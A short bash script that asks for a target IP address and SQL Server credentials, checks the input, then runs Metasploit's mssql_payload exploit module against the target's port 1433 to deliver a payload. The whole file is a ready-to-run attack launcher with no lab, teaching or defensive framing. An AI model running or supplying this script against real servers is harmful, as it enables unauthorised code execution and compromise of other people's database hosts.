#!/usr/bin/env bash
set -euo pipefail

read -rp "Target IP: " RHOST
read -rp "SQL username: " USERNAME
read -rsp "SQL password: " PASSWORD
echo
read -rp "Database [master]: " DATABASE
DATABASE="${DATABASE:-master}"

if [[ ! "$RHOST" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo "Error: Enter a valid IPv4 address format."
    exit 1
fi

if [[ -z "$USERNAME" || -z "$PASSWORD" ]]; then
    echo "Error: Username and password are required."
    exit 1
fi

printf '\nConfiguration:\n'
printf 'Target:   %s\n' "$RHOST"
printf 'Username: %s\n' "$USERNAME"
printf 'Database: %s\n\n' "$DATABASE"

echo "Starting Metasploit..."
msfconsole -x "use exploit/windows/mssql/mssql_payload; set RHOSTS $RHOST; set RPORT 1433; set USERNAME $USERNAME; set PASSWORD $PASSWORD; set DATABASE $DATABASE; exploit" 